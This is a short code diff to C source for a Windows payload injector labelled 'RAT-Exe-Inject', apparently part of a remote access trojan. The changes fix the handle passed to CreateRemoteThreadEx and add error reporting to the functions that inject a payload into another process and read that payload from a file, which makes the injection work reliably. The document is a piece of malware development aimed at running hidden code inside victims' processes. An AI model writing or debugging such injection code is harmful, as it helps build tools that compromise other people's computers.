@@ -69,10 +69,11 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 		goto cleanup;
 	}
 
-	hThread = CreateRemoteThreadEx(&hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, NULL, NULL, threadID);
+	hThread = CreateRemoteThreadEx(hProcess, NULL, payloadSize, (LPTHREAD_START_ROUTINE)baseAddress, NULL, NULL, NULL, threadID);
 	if (hThread == NULL)
 	{
-		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to start remote thread!\n");
+		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to start remote thread! Error %d\n", GetLastError());
+		OutputDebugStringA(messageBuffer);
 		status = GetLastError();
 		goto cleanup;
 	}
@@ -103,6 +104,7 @@ INT readPayload(__in char* filePath, __inout UINT64* payloadSize, __inout char**
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		OutputDebugStringA("RAT-Exe-Inject::readPayload - Failed to obtain file handle!\n");
+		status = GetLastError();
 		goto cleanup;
 	}
 
